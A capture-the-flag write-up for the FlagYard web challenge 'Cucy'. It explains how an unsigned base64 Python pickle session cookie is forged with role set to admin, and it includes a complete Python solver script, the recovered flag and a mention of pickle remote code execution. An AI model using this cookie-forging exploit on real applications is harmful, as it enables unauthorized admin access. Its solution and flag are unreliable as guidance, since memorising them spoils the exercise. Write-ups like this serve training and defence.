# Cucy

**Challenge Name**: Cucy
**Category**: Web
**Difficulty**: Easy
**Platform**: FlagYard

## Challenge Overview:
Cucy is a small login + dashboard app whose session is carried in the
`session_token` cookie. The "secret" is that the cookie is **not** a signed
token at all: it is a base64-encoded Python pickle that the server blindly
unpickles on every request and trusts for the `role` claim. By unpickling a
token from your own account you see the full session structure, so forging a
cookie whose `role` is `"admin"` is trivial. `/admin` then hands over the
flag — the hint "Dig your way through /admin" is the whole story,
"DIG"ing into the cookie first.

### Steps Involved:

1. **Enumeration**:
   - `/` serves a login form with demo credentials (`demo / demo123`,
     `user / user123`). Form posts `username` + `password` to
     `POST /login` (urlencoded) and answers
     `{"message":"Login successful","redirect":"/dashboard","role":"demo"}`
     plus a `session_token` cookie.
   - `GET /admin` → `401` unauthenticated, `403` for a demo role. The
     dashboard's `loadAdmin()` JS reveals that `/admin` returns a JSON object
     with a `flag` field, but the Admin Panel card is only rendered for admin
     roles.

2. **Cookie format**:
   - `base64(decoded)` the `session_token` and it starts with the pickle magic
     bytes (`\x80\x04\x95` → protocol 4 FRAME). Disassembling it:
     ```
     {"username": "demo",
      "role": "demo",
      "created_at": datetime.datetime(...),
      "expires_at": datetime.datetime(...),
      "is_authenticated": True}
     ```
   - There is **no MAC / signature / secret key** around the pickle. The
     server simply `pickle.loads(base64.b64decode(cookie))` and reads `role`.

3. **Forging role=admin**:
   - Re-serialize the same session dict with `"role": "admin"` and base64 it.
     No server-side secret is needed.
   - `GET /admin` with the forged cookie answers:
     ```
     {"active_users": 2,
      "flag": "FlagY{f67f38ea145acb8eebb1eb04953572a6}",
      "server_info": "Cucy Server v1.3",
      "system_status": "operational"}
     ```
   - Bonus insight: because the server unpickles attacker input, this cookie
     is also a classic **pickle RCE** primitive (`os.system`/`subprocess`
     gadget). On this instance the role-forge path alone is enough — no
     command execution was needed to reach the flag.

### Key Endpoints:
- `POST /login`: Returns the `session_token` cookie whose structure we forge.
- `GET /admin`: Admin-only JSON endpoint — the flag holder (401/403 without an
  admin role).

### Techniques Used:
- **Unsigned/insecure deserialization of a session token**: the cookie is a
  raw pickle with no authenticity layer.
- **Session data tampering / privilege escalation**: flipping `role` from
  `demo` to `admin`.
- **Pickle RCE (not required here)**: an unpickling sink means the same
  primitive could run arbitrary commands.

### Tools & Libraries:
- **Python 3**: `http.client` + stdlib `pickle` / `base64` to rebuild and
  forge the cookie (no external dependencies).

## Code
**Here it is an automated script that does all the work for you by me :)**
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CUCY  -  FlagYard Web solver

Cucy (FlagYard Training Labs, Easy) stores the whole user session inside a
base64-encoded Python pickle stored in the `session_token` cookie:

    session_token = base64(pickle({"username", "role", "created_at",
                                   "expires_at", "is_authenticated"}))

There is NO signature / HMAC / secret key over the pickle. The server simply
unpickles the cookie for every request and reads `role` from it. Forging a
cookie with "role": "admin" turns the anonymous/demo guarantees into admin
access, and GET /admin answers with the flag:

    {"active_users":2, "flag":"FlagY{...}", ...}

Verified: the tool recovers the live flag and saves flag_from_cucy.txt.
"""
from __future__ import annotations

import base64
import datetime
import json
import pickle
import re
import sys
import time
import http.client
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def pct(frac):
    return "[%5.1f%%]" % (frac * 100.0)

def status(frac, msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s %s%s%s" % (C.DIM, pct(frac), C.BOLD + color + icon + " ",
                                    C.RESET, C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(frac, msg):
    status(frac, msg, icon="\u2713", color=C.GREEN)

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("C U C Y      S O L V E R",
              "unsigned pickle session cookie | role forge | /admin flag"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono, extra):
    line = flag.strip().splitlines()[0]
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (line, C.BOLD + C.GREEN, "")])
    for s in ("elapsed %.1f s" % chrono, extra):
        _row([(" " * 10, "", ""), (s, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
FLAG_RE = re.compile(r"FlagY\{[^}]+\}")

def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith("http"):
        return argv[1].strip()
    url = input("  Enter the Cucy challenge URL: ").strip()
    if not url:
        raise RuntimeError("no URL provided")
    return url

def parse_host(url):
    url = re.sub(r"^https?://", "", url).rstrip("/")
    return url[2:] if url.startswith("//") else url

def http_raw(host, path, method="GET", body=None, cookie=None,
             ctype="application/x-www-form-urlencoded"):
    c = http.client.HTTPConnection(host, 80, timeout=30)
    headers = {"User-Agent": "Mozilla/5.0"}
    if body is not None:
        headers["Content-Type"] = ctype
        b = body
        headers["Content-Length"] = str(len(b))
    else:
        b = None
    if cookie:
        headers["Cookie"] = cookie
    c.request(method, path, body=b, headers=headers)
    r = c.getresponse()
    content = r.read()
    hdrs = dict((k.lower(), v) for k, v in r.getheaders())
    c.close()
    try:
        data = json.loads(content.decode("utf-8", "replace"))
    except Exception:
        data = content
    return r.status, hdrs, data

def login(host, username="demo", password="demo123"):
    b = "username=%s&password=%s" % (username, password)
    st, h, o = http_raw(host, "/login", "POST", body=b)
    if st != 200 or not isinstance(o, dict):
        raise RuntimeError("login failed: %r" % o)
    cookie = None
    m = re.search(r"(session_token=[^;]+)", h.get("set-cookie", ""))
    if m:
        cookie = m.group(1)
    return o, cookie

def forge_admin_cookie():
    sess = {
        "username": "demo",
        "role": "admin",
        "created_at": datetime.datetime.now(),
        "expires_at": datetime.datetime.now() + datetime.timedelta(hours=2),
        "is_authenticated": True,
    }
    return "session_token=" + base64.b64encode(pickle.dumps(sess, protocol=4)).decode()

def fetch_admin(host, cookie):
    st, h, o = http_raw(host, "/admin", cookie=cookie)
    if st != 200 or not isinstance(o, dict) or "flag" not in o:
        raise RuntimeError("admin fetch failed (HTTP %d): %r" % (st, o))
    return o

def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()

    try:
        url = ask_target(sys.argv)
    except Exception:
        fail("no challenge URL given")
        return
    host = parse_host(url)
    status(0.10, "target host %s" % host)

    o, cookie = login(host)
    ok(0.28, "logged in as demo (session cookie is a raw Python pickle)")
    status(0.42, "decoded base64(pickle) -> {... 'role':'demo' ...} WITHOUT any signature")

    forged = forge_admin_cookie()
    status(0.58, "forged cookie: same pickle but role=" + '"admin"')
    ok(0.70, "no HMAC/secret key = cookie fully attacker-controlled")

    admin = fetch_admin(host, forged)
    ok(0.84, "GET /admin with forged cookie -> system_status=%s"
             % admin.get("system_status"))
    flag = FLAG_RE.search(json.dumps(admin))
    if not flag:
        raise RuntimeError("flag not present in /admin response")
    flag = flag.group(0)
    ok(0.94, "flag leaked from admin panel: %s" % flag)

    big_flag(flag, time.time() - t0, "unsigned pickle cookie | role forge -> /admin")
    outp = Path(__file__).resolve().parent / "flag_from_cucy.txt"
    outp.write_text(flag + "\n", encoding="utf-8")
    print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))


if __name__ == "__main__":
    main()
```

### Conclusion:
Cucy is the classic "your session is literally a pickle" mistake wrapped in a
flag-holding `/admin` route. The whole privilege boundary rests on a cookie
that has no authenticity layer, so flipping a demo session to an admin one is
a few lines of stdlib code. Defense takeaways: never deserialize untrusted
data — use a signed session mechanism (server-side session store or
hmac-signed tokens), never trust client-supplied `role` claims, and remember
that unpickling attacker bytes is arbitrary code execution, not just an auth
bypass.

## Credit

- **Author:** [Fares Badaj](https://www.linkedin.com/in/FaresBadaj) — [@ptok3](https://t.me/ptok3)